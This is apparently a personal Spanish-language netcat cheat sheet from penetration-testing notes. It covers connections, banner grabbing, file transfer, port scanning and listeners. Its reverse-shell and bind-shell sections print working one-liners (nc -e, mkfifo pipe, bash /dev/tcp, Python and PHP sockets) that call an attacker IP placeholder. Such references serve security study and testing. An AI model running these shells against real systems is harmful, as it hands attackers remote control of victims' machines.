# Netcat — Cheat Sheet

> Lectura/escritura de conexiones de red, reverse shells, transfers.

---

## Uso básico

```bash
nc <host> <port>                 # Conectar
nc -l <port>                     # Escuchar
nc -v <host> <port>              # Verbose
```

## Banner grabbing

```bash
nc <host> <port>                 # Conectar y ver banner
nc -v <host> 21                  # FTP banner
nc -v <host> 25                  # SMTP banner
```

## Transferencia de archivos

```bash
# Receptor
nc -lvnp 4444 > archivo_recibido

# Emisor
nc <host> 4444 < archivo_enviar
```

## Reverse shell

```bash
# Víctima
nc -e /bin/sh <attacker_ip> 4444

# Sin -e (si no está compilado con support)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> 4444 > /tmp/f

# Variantes alternativas
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<attacker_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
php -r '$sock=fsockopen("<attacker_ip>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Bind shell

```bash
# Víctima
nc -lvnp 4444 -e /bin/sh

# Atacante
nc <victim_ip> 4444
```

## Port scanning

```bash
nc -zv <host> 1-1000             # Scan range
nc -zv <host> 80,443             # Scan specific ports
nc -zvn <host> 1-1000            # Sin resolve DNS
```

## Listener con options

```bash
nc -lvnp <port>                  # Listen verbose, numeric, no DNS
nc -k -lvnp <port>               # Keep alive (no cerrar después de conexión)
```









---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[Metasploit.md|Metasploit]] — Linux, Metodologia Pentest, Netcat / Reverse Shells
- [[../../apuntes evolve/BLOQUE 7.md|BLOQUE 7]] — Linux, Metodologia Pentest, Netcat / Reverse Shells
- [[../11 - Forense Digital/Análisis Forense y Memoria.md|Análisis Forense y Memoria]] — Linux, Metodologia Pentest, Netcat / Reverse Shells
- [[../../apuntes evolve/BLOQUE 6.md|BLOQUE 6]] — Linux, Metodologia Pentest, Netcat / Reverse Shells
- [[../06 - Explotacion y Post-Explotacion/Escalada de Privilegios.md|Escalada de Privilegios]] — Linux, Metodologia Pentest, Netcat / Reverse Shells

### 🌐 Cross-Dominio

- [[../../../programacion/XML/xpath_xslt.md|xpath_xslt]] — Programacion: CLI/Scripting, Linux, Redes
- [[../../../redes/dig_nslookup.md|dig_nslookup]] — Redes: CLI/Scripting, Linux, Redes

> #cli #forense #linux #linux_ciber #metasploit #netcat #pentest #redes #reverse_shell #windows_ciber
